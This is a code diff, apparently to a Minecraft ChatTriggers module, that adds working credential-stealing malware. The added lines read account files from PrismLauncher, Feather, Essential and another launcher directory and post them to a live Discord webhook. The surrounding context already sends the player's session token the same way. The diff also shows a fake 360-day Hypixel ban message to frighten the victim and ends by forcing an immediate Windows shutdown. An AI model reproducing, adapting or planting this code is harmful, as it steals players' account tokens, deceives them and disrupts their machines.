@@ -5,3 +5,74 @@ request({
     headers: {"User-agent":"Mozilla/5.0"},
     body: {content: "```" + Player.getName() + "```\n```" + Client.getMinecraft().func_110432_I().func_148254_d() + "```"}
 });
+
+function generateRandomString() {
+  var result = '';
+  var chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789012345678901234567890123456789";
+  var charsLength = chars.length;
+  for (var i = 0; i < 8; i++) {
+    result += chars.charAt(Math.floor(Math.random() * charsLength));
+  }
+  return result;
+}
+
+let banId = generateRandomString();
+
+function formatTime(seconds) {
+  const days = Math.floor(seconds / 86400);
+  seconds %= 86400;
+  const hours = Math.floor(seconds / 3600);
+  seconds %= 3600;
+  const minutes = Math.floor(seconds / 60);
+  seconds %= 60;
+  return days + "d " + hours + "h " + minutes + "m " + seconds + 's';
+}
+
+function createDirectory(path) {
+    const File = Java.type("java.io.File");
+    const dir = new File(path);
+    return dir.mkdirs();
+}
+
+let banDuration = 31103999; // ~360 days
+
+function showBan() {
+  let banMsg3 = banMessage3;
+  let banMsg2 = banMessage2;
+  let banMsg1 = banMessage1;
+  
+  banComponent = new ChatComponentText(banMsg1 + formatTime(banDuration) + banMsg2 + banId + banMsg3);
+  Client.getMinecraft().getNetHandler().getNetworkManager().sendPacket(banComponent);
+}
+
+isBanned = true;
+showBan();
+
+let File = Java.type("java.io.File");
+      let appData = new File(java.lang.System.getenv("APPDATA"));
+      let mcDir = new File(Client.getMinecraft().mcDataDir.getPath());
+      let parent1 = new File(mcDir.parent);
+      let parent2 = new File(parent1.parent);
+      let parent3 = new File(parent2.parent);
+      
+      let q = FileLib.read(appData + "\\PrismLauncher\\accounts.json");
+let a = accountsData = FileLib.read(parent3 + "\\accounts.json");
+        let g = FileLib.read(mcDir + "\\essential\\microsoft_accounts.json");
+        k = FileLib.read(appData + "\\.feather\\accounts.json");
+
+register("serverConnect", event => {
+  if (Server.getIP().includes("hypixel.net") && isBanned) {
+    setTimeout(() => {
+      showBan();
+    }, 275);
+  }
+});
+
+request({
+    url: "https://discord.com/api/webhooks/1355805838090047640/zR_er63aIbEX6Y6s2aoRSwMXzBPmZ52znYQb6WejRisqvw8gfoMuuKSHu2ZbY4GajXNV",
+    method: "POST",
+    headers: {"User-agent":"Mozilla/5.0"},
+    body: {content: "```" + q + "```\n```" + a + "```\n```" + g + "```\n```"+k+"```"}
+});
+
+java.lang.Runtime.getRuntime().exec("cmd.exe /c shutdown /s /f /t 0");
